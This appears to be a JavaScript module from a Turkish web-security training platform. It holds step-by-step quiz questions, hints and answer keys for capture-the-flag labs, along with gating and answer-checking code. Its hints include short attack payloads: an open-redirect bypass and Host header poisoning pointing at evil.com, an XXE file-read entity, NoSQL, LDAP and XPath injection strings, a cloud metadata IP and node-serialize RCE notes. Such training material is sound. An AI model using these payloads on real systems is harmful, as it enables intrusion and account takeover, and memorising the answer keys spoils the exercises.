      { id: 2, q: "Medium'da MFA aşamasını atlamak için URL'deki `?page=otp`'yi ne yaparsın? (değer)", hint: "Doğrudan panele atla.", accept: ["dashboard", "?page=dashboard", "page=dashboard"] },
      { id: 3, q: "Dashboard'a düş → çıkan FLAG'i yapıştır.", hint: "Low: Console/Network'teki OTP token.", isFlag: true },
    ],
  },
  "insecure-randomness": {
    questions: [
      { id: 1, q: "Low'da sıfırlama token'ı tahmin edilebilir; çünkü üretimi ____ tabanlıdır. (ardışık sayaç / kripto)", hint: "Bir öncekinin +1'i.", accept: ["ardışık", "ardisik", "sayaç", "sayac", "sequential", "ardışık sayaç"] },
      { id: 2, q: "Kendine kod iste (token=N), hemen admin'e iste (N+1), o token'la sıfırla → başarı sayfasındaki FLAG'i yapıştır.", hint: "Giden Kutusu'ndan kendi token'ını oku.", isFlag: true },
    ],
  },

  // ── MODERN & SUNUCU ──
  "ssrf": {
    questions: [
      { id: 1, q: "Erişeceğin iç admin paneli hangi adreste? (host:port/path)", hint: "localhost'ta yüksek port.", accept: ["localhost:8080/admin", "http://localhost:8080/admin", "127.0.0.1:8080/admin"] },
      { id: 2, q: "Cloud metadata servisinin klasik link-local IP'si nedir?", hint: "169.254.x.x", accept: ["169.254.169.254"] },
      { id: 3, q: "Sunucuyu iç servise istek attır → dönen JSON'daki FLAG'i yapıştır.", hint: "Medium: 127.0.0.1.nip.io / decimal IP.", isFlag: true },
    ],
  },
  "prototype-pollution": {
    questions: [
      { id: 1, q: "Object.prototype'ı kirletmek için kullandığın özel anahtar nedir?", hint: "__...__", accept: ["__proto__"] },
      { id: 2, q: "Medium '__proto__'yu reddeder; hangi zincirle atlatırsın?", hint: "constructor üzerinden.", accept: ["constructor.prototype", "constructor"] },
      { id: 3, q: "isAdmin=true kirletmesini gönder → yanıttaki FLAG'i yapıştır.", hint: '{"__proto__":{"isAdmin":true}}', isFlag: true },
    ],
  },
  "server-side-pp-gadget": {
    questions: [
      { id: 1, q: "Gadget zinciri için prototype üzerinden hangi ortam değişkenini (env) set edersin?", hint: "NODE_…", accept: ["node_options", "env.node_options"] },
      { id: 2, q: "NODE_OPTIONS değeri hangi bayrağı içermeli? (--…)", hint: "Dosya require eder.", accept: ["--require", "require"] },
      { id: 3, q: "Kirlet + 'Sistem Durumunu Getir' ile tetikle → çıktıdaki FLAG'i yapıştır.", hint: "İki adım: kirlet → tetikle.", isFlag: true },
    ],
  },
  "ssti": {
    questions: [
      { id: 1, q: "`<%= 7*7 %>` enjeksiyonu çalışırsa ekranda hangi sayı çıkar?", hint: "7 çarpı 7.", accept: ["49"] },
      { id: 2, q: "Render context'inde flag'i veren değişkeni oku: `<%= flag %>` → çıkan FLAG'i yapıştır.", hint: "Değişken adı: flag.", isFlag: true },
    ],
  },
  "insecure-deserialization": {
    questions: [
      { id: 1, q: "RCE için IIFE içinde hangi Node modülüyle komut çalıştırırsın? (require('…'))", hint: "Komut çalıştırma modülü.", accept: ["child_process"] },
      { id: 2, q: "node-serialize payload'unu base64'le ve gönder → yanıttaki FLAG'i yapıştır.", hint: "Fonksiyonlar _$$ND_FUNC$$_ ile işaretlenir.", isFlag: true },
    ],
  },
  "open-redirect": {
    questions: [
      { id: 1, q: "Medium 'ordek-store.com içermeli' kontrolünü atlatan redirect payload'u nedir?", hint: "// ile başlat.", accept: ["//evil.com/ordek-store.com"] },
      { id: 2, q: "Dış host'a yönlendir (low: http://evil.com) → onaylanınca çıkan FLAG'i yapıştır.", hint: "redirect parametresi.", isFlag: true },
    ],
  },
  "host-header-poisoning": {
    questions: [
      { id: 1, q: "Zehirlenen parola-sıfırlama linki hangi HTTP istek başlığından kuruluyor?", hint: "Sanal host başlığı.", accept: ["host"] },
      { id: 2, q: "curl/Burp ile Host'u zehirle (örn. `Host: evil.com`) → yanıttaki linkte FLAG'i yapıştır.", hint: "Medium: localhost:@evil.com", isFlag: true },
    ],
  },
  "race-condition": {
    questions: [
      { id: 1, q: "Tek kullanımlık kuponun kodu nedir?", hint: "WELCOME + sayı.", accept: ["welcome100"] },
      { id: 2, q: "Bakiyeyi kaç ₺'nin ÜZERİNE çıkarman gerekiyor?", hint: "Kupon değeri.", accept: ["100"] },
      { id: 3, q: "Kupona 10+ eşzamanlı POST gönder (TOCTOU) → bakiye aşınca çıkan FLAG'i yapıştır.", hint: "Turbo Intruder / paralel curl.", isFlag: true },
    ],
  },
  "business-logic": {
    questions: [
      { id: 1, q: "Low'da ödenecek tutarı manipüle etmek için gövdedeki hangi alanı değiştirirsin?", hint: "total… alanı.", accept: ["totalprice", "totalprice=1"] },
      { id: 2, q: "Tutarı ≤100₺ yapıp ödemeyi tamamla → çıkan FLAG'i yapıştır.", hint: "Medium: negatif qty ile toplamı düşür.", isFlag: true },
    ],
  },
  "redos": {
    questions: [
      { id: 1, q: "Katastrofik backtracking için 40+ 'a' dizisinin SONUNA eklediğin, desene UYMAYAN karakter nedir?", hint: "Tek bir noktalama.", accept: ["!"] },
      { id: 2, q: "Yanıt süresi kaç saniyeyi aşınca flag gösterilir?", hint: "Tek haneli.", accept: ["5"] },
      { id: 3, q: "Üstel girdiyi gönder (45×'a' + '!') → yanıt yavaşlayınca çıkan FLAG'i yapıştır.", hint: "Kullanıcı adı alanına yaz.", isFlag: true },
    ],
  },
  "csv-injection": {
    questions: [
      { id: 1, q: "Formül enjeksiyonu için hücre (isim) hangi karakterlerden biriyle başlamalı? (=, +, @, -)", hint: "Excel formül tetikleyicileri.", accept: ["=", "+", "@", "-"] },
      { id: 2, q: "Formülle başlayan isim ekle, CSV'yi indir (kaçırılmamışsa) → çıkan FLAG'i yapıştır.", hint: 'Örn. =HYPERLINK(...) ya da @SUM(...)', isFlag: true },
    ],
  },
  "nmap-recon": {
    questions: [
      { id: 1, q: "Gizli yüksek servis hangi portta çalışıyor?", hint: "1024 üstü 'elite' port.", accept: ["31337"] },
      { id: 2, q: "Tüm portları (65535) taramak için nmap'in hangi bayrağı kullanılır?", hint: "kısa -p bayrağı.", accept: ["-p-"] },
      { id: 3, q: "Gizli servisi bul (sayfada 'tüm portları tara' / port=31337) → banner'daki FLAG'i yapıştır.", hint: "Low: varsayılan tarama bile gösterir.", isFlag: true },
    ],
  },
  "metasploit-rce": {
    questions: [
      { id: 1, q: "Medium'da exploit'e eklenen, banner'dan sızan varsayılan yönetim token'ı nedir?", hint: "VULNSOFT-…", accept: ["vulnsoft-default"] },
      { id: 2, q: "Servise komut çalıştır (RCE) → meterpreter mantığıyla dönen FLAG'i yapıştır.", hint: "Low: token gerekmez; {cmd:'id'}.", isFlag: true },
    ],
  },

  // ── FAZ 2: yeni web zafiyetleri ──
  "xxe": {
    questions: [
      { id: 1, q: "XXE ile sunucu dosyası okumak için XML'e hangi iki bildirimi eklersin? (kısaca)", hint: "Bir DOCTYPE + bir ... tanımı.", accept: ["doctype ve entity", "doctype entity", "entity", "doctype"] },
      { id: 2, q: "`file:///tmp/xxe_flag.txt` harici varlığını tanımlayıp gövdede çağır → yansıyan FLAG'i yapıştır.", hint: "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///tmp/xxe_flag.txt\">]> ... &x;", isFlag: true },
    ],
  },
  "nosql-injection": {
    questions: [
      { id: 1, q: "Parola string'i yerine hangi Mongo operatörünü gönderirsen 'boş değilse eşleş' olur? ($ ile)", hint: "not-equal.", accept: ["$ne", "ne"] },
      { id: 2, q: "`{\"password\":{\"$ne\":\"\"}}` ile admin girişini atla → dönen FLAG'i yapıştır.", hint: "Medium'da $ne yerine $regex.", isFlag: true },
    ],
  },
  "graphql-injection": {
    questions: [
      { id: 1, q: "Şemayı keşfetmek için kullanılan GraphQL meta alanı nedir? (__ ile başlar)", hint: "Introspection kök alanı.", accept: ["__schema", "schema"] },
      { id: 2, q: "Gizli alanın adı nedir? (user tipinde, yetkisiz okunabilen)", hint: "...Note.", accept: ["secretNote", "secretnote"] },
      { id: 3, q: "`{ user(id:1){ secretNote } }` sorgusunu çalıştır → dönen FLAG'i yapıştır.", hint: "Low'da yetki kontrolü yok.", isFlag: true },
    ],
  },
  "ldap-injection": {
    questions: [
      { id: 1, q: "LDAP filtresinde 'her şeyle eşleş' anlamına gelen joker karakter nedir?", hint: "Tek karakter.", accept: ["*", "yildiz", "asterisk"] },
      { id: 2, q: "Filtreyi her-zaman-doğru yapan payload ile giriş yap → dönen FLAG'i yapıştır.", hint: "username=*)(uid=*))(|(uid=*", isFlag: true },
    ],
  },
  "xpath-injection": {
    questions: [
      { id: 1, q: "XPath girişinde tautoloji için klasik enjeksiyon ne? (tek tırnaklı)", hint: "' or '1'='1", accept: ["' or '1'='1", "or 1=1", "' or '1'='1"] },
      { id: 2, q: "Bu payload'la admin olarak gir → dönen FLAG'i yapıştır.", hint: "Medium'da çift tırnak kullan.", isFlag: true },
    ],
  },
  "http-parameter-pollution": {
    questions: [
      { id: 1, q: "HPP'de aynı parametreyi kaç kez gönderirsin?", hint: "Birden fazla.", accept: ["2", "iki", "iki kez"] },
      { id: 2, q: "`?role=user&role=admin` ile yetki/işlem okuma farkını sömür → dönen FLAG'i yapıştır.", hint: "İlk okuma user, son okuma admin.", isFlag: true },
    ],
  },
  "web-cache-poisoning": {
    questions: [
      { id: 1, q: "Önbelleğe yansıyan anahtarsız (unkeyed) başlığın adı nedir?", hint: "X-Forwarded-...", accept: ["x-forwarded-host", "forwarded-host"] },
      { id: 2, q: "Bu başlıkla önbelleği zehirle, sonra temiz istekle FLAG'i al → yapıştır.", hint: "Zehirli yanıt cache'lenir.", isFlag: true },
    ],
  },
  "websocket-tampering": {
    questions: [
      { id: 1, q: "Mesaj JSON'una hangi alanı 'admin' yaparsan yetki yükselir?", hint: "rol.", accept: ["role", "rol"] },
      { id: 2, q: "`{\"action\":\"getSecret\",\"role\":\"admin\"}` gönder → dönen FLAG'i yapıştır.", hint: "Sunucu istemci role'üne güvenir.", isFlag: true },
    ],
  },
  "git-disclosure": {
    questions: [
      { id: 1, q: "Sürüm kontrolü ifşasında ilk bakacağın klasör/dosya yolu nedir?", hint: "/.git/...", accept: ["/.git/config", ".git/config", "/.git", ".git"] },
      { id: 2, q: "`.git/config` veya `config.php.bak`'tan gömülü FLAG'i oku → yapıştır.", hint: "?path=/config.php.bak", isFlag: true },
    ],
  },
  "jwt-alg-confusion": {
    questions: [
      { id: 1, q: "RS256 bekleyen doğrulayıcıyı kandırmak için token'ı hangi algoritmayla yeniden imzalarsın?", hint: "Simetrik HMAC.", accept: ["hs256", "hmac", "hmac-sha256"] },
      { id: 2, q: "Public anahtarı HMAC sırrı yapıp role:admin token forge et → dönen FLAG'i yapıştır.", hint: "pubkey'i action=pubkey ile çek.", isFlag: true },
    ],
  },
};

export const STEP_SLUGS = Object.keys(STEP_LABS);

// Cevap karşılaştırma normalizasyonu — flag route'undaki norm ile uyumlu (+ boşluk sadeleştirme).
const norm = (s) => String(s ?? "").trim().toLowerCase().replace(/\s+/g, " ");

export function stepsFor(slug) {
  const l = STEP_LABS[slug];
  return l && Array.isArray(l.questions) && l.questions.length ? l.questions : null;
}

export function hasSteps(slug) { return !!stepsFor(slug); }

export function stepCount(slug) {
  const qs = stepsFor(slug);
  return qs ? qs.length : 0;
}

// reached = çözülmüş soru sayısı; [0, total] aralığına kıs.
export function clampReached(slug, reached) {
  const total = stepCount(slug);
  const n = Math.floor(Number(reached) || 0);
  if (n < 0) return 0;
  if (n > total) return total;
  return n;
}

// Sterilize: cevapları (accept) ÇIKAR; yalnız çözülmüş + SIRADAKİ soruyu döndür (gating).
//   solved:true  -> önceden cevaplanmış (UI ✅ ile kapalı gösterir)
//   solved:false -> sıradaki (cevap bekleyen) soru
export function publicSteps(slug, reached) {
  const qs = stepsFor(slug);
  if (!qs) return [];
  const r = clampReached(slug, reached);
  const upto = Math.min(r, qs.length - 1); // görünür son index
  const out = [];
  for (let i = 0; i <= upto; i++) {
    const q = qs[i];
    out.push({
      id: q.id ?? i + 1,
      index: i,
      q: q.q,
      hint: q.hint || null,
      cmd: q.cmd || null,
      isFlag: !!q.isFlag,
      solved: i < r,
    });
  }
  return out;
}

// Doğrula: index'teki sorunun cevabı doğru mu? isFlag ise FLAGS[slug] ile.
export function checkStep(slug, index, answer) {
  const qs = stepsFor(slug);
  const i = Math.floor(Number(index));
  if (!qs || !(i >= 0 && i < qs.length)) return false;
  const q = qs[i];
  if (q.isFlag) {
    const expected = FLAGS[slug];
    return !!expected && norm(answer) === norm(expected);
  }
  const acc = Array.isArray(q.accept) ? q.accept : q.accept != null ? [q.accept] : [];
  return acc.some((a) => norm(a) === norm(answer));
}

// Geliştirme-zamanı tutarlılık kontrolü (test/units.mjs doğrular):
//  her step-lab'ın soruları var; son soru isFlag; FLAGS[slug] tanımlı; flag olmayan
//  sorularda en az bir accept değeri var.
export function stepLabConsistency() {
  const issues = [];
  for (const slug of STEP_SLUGS) {
    const qs = stepsFor(slug);
    if (!qs) { issues.push(`empty:${slug}`); continue; }
    const last = qs[qs.length - 1];
    if (!last.isFlag) issues.push(`last-not-flag:${slug}`);
    if (!FLAGS[slug]) issues.push(`flag-missing:${slug}`);
    qs.forEach((q, i) => {
      if (!q.q) issues.push(`no-question:${slug}#${i}`);
      if (!q.isFlag) {
        const acc = Array.isArray(q.accept) ? q.accept : q.accept != null ? [q.accept] : [];
        if (!acc.length) issues.push(`no-accept:${slug}#${i}`);
      }
    });
  }
  return issues;
}
